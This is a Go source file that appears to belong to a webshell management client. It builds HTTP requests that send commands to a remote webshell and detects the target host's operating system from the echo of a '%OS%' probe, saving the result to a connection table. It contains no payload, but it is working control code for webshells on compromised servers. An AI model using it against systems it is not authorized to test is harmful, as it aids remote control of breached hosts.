package handler

import (
	"bytes"
	"io"
	"net/http"
	"strings"

	"go.uber.org/zap"
)

// webshellOSProbeCommand probe command: uses the difference in how Windows cmd and POSIX shell expand `%OS%` to detect the OS.
//   - Windows cmd: `%OS%` is expanded to `Windows_NT`, echoing `:OSPROBE_Windows_NT:END`
//   - POSIX sh/bash: `%OS%` is not variable syntax and is kept as a literal, echoing `:OSPROBE_%OS%:END`
//
// A single command yields a clear, mutually exclusive signal, reducing probe overhead (compared to sending two commands).
// Colon wrapping prevents string matching failures when some shells output extra whitespace or a BOM.
const webshellOSProbeCommand = "echo :OSPROBE_%OS%:END"

// probeWebshellOSViaExec infers the target operating system from the echo of a single command execution.
//
// Returns:
//   - "windows" / "linux": detection successful
//   - "": unable to determine (caller should keep existing fallback logic)
//
// execFn is a "send command and get echo" closure; allows the HTTP and MCP entry points to share the same probe logic
// without caring about the underlying packet format.
func probeWebshellOSViaExec(execFn func(cmd string) (output string, ok bool)) string {
	if execFn == nil {
		return ""
	}
	out, ok := execFn(webshellOSProbeCommand)
	if !ok {
		return ""
	}
	return classifyWebshellOSProbeOutput(out)
}

// classifyWebshellOSProbeOutput is a pure function: determines the OS from the probe command's echo output.
// Extracted so unit tests can cover all branches without needing real HTTP calls.
func classifyWebshellOSProbeOutput(out string) string {
	if out == "" {
		return ""
	}
	lower := strings.ToLower(out)

	// Strong Windows signal: cmd.exe successfully expanded the %OS% variable
	if strings.Contains(out, "Windows_NT") {
		return "windows"
	}
	// Fault tolerance: some older Windows versions may expand `%OS%` to other strings (very rare); check secondary clues like PATH/OS
	if strings.Contains(lower, "microsoft windows") {
		return "windows"
	}

	// Strong Linux/Unix signal: `%OS%` literal is echoed as-is, indicating the shell is not cmd.exe
	if strings.Contains(out, "%OS%") {
		return "linux"
	}

	// Secondary clue: some webshells on Linux may use other shells (e.g. zsh/ash),
	// but they also do not expand `%OS%`; if the OSPROBE prefix is matched but the %OS% literal is missing,
	// the echo was truncated or filtered; conservatively return empty and let the caller fallback.
	return ""
}

// newHTTPExecFn builds a "send command and get echo" closure for the HTTP file-op path, reusable for probing.
// Parameters come from the HTTP request; reuses the existing buildExecURL / buildExecBody command orchestrators
// to ensure the probe packet follows exactly the same webshell protocol as real file operations (GET/POST, param names, encoding).
func (h *WebShellHandler) newHTTPExecFn(targetURL, password, shellType, method, cmdParam, encoding string) func(string) (string, bool) {
	useGET := strings.ToUpper(strings.TrimSpace(method)) == "GET"
	if strings.TrimSpace(cmdParam) == "" {
		cmdParam = "cmd"
	}
	return func(cmd string) (string, bool) {
		var (
			httpReq *http.Request
			err     error
		)
		if useGET {
			u := h.buildExecURL(targetURL, shellType, password, cmdParam, cmd)
			httpReq, err = http.NewRequest(http.MethodGet, u, nil)
		} else {
			body := h.buildExecBody(shellType, password, cmdParam, cmd)
			httpReq, err = http.NewRequest(http.MethodPost, targetURL, bytes.NewReader(body))
			if err == nil {
				httpReq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			}
		}
		if err != nil {
			return "", false
		}
		httpReq.Header.Set("User-Agent", "Mozilla/5.0 (compatible; Kestrel-WebShell/1.0)")
		resp, err := h.client.Do(httpReq)
		if err != nil {
			return "", false
		}
		defer resp.Body.Close()
		raw, _ := io.ReadAll(resp.Body)
		return decodeWebshellOutput(raw, encoding), resp.StatusCode == http.StatusOK
	}
}

// persistDetectedOS writes the probe result back to the connection table; failures are logged but do not block the main flow.
// Intentionally only triggers an UPDATE, never inserts a new record; if connectionID does not exist it silently no-ops.
func (h *WebShellHandler) persistDetectedOS(connectionID, detected string) {
	connectionID = strings.TrimSpace(connectionID)
	detected = normalizeWebshellOS(detected)
	if connectionID == "" || detected == "" || detected == "auto" {
		return
	}
	conn, err := h.db.GetWebshellConnection(connectionID)
	if err != nil || conn == nil {
		// Not all callers can provide a valid ID (e.g. temporary tests); silently return here
		return
	}
	if normalizeWebshellOS(conn.OS) != "auto" {
		// User has already explicitly selected an OS; respect the user's choice and do not auto-overwrite
		return
	}
	conn.OS = detected
	if err := h.db.UpdateWebshellConnection(conn); err != nil {
		h.logger.Warn("webshell OS probe result persistence failed", zap.String("id", connectionID), zap.String("os", detected), zap.Error(err))
		return
	}
	h.logger.Info("webshell auto OS probe successful and persisted", zap.String("id", connectionID), zap.String("os", detected))
}
